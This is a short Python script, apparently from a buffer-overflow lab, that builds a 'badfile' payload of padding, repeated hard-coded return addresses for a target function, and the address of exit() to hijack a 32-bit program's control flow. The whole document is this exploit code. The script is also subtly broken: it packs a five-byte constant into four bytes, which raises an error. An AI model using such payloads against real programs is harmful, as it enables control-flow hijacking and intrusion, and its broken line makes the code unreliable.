import sys
def tobytes(value):
    return (value).to_bytes(4,byteorder='little')
bar_addr=0x8048567 # address of function()
exit_addr=0xb7e339d0 #address of exit()
content=bytearray(0xaa for i in range(112))
content+=tobytes(0xFFFFFFFFFF)
for i in range(10):
    content+=tobytes(bar_addr)

#invoke exit() to exit gracefully at the end
content+=tobytes(exit_addr)
with open("badfile" ,"wb") as f:
    f.write(content)
    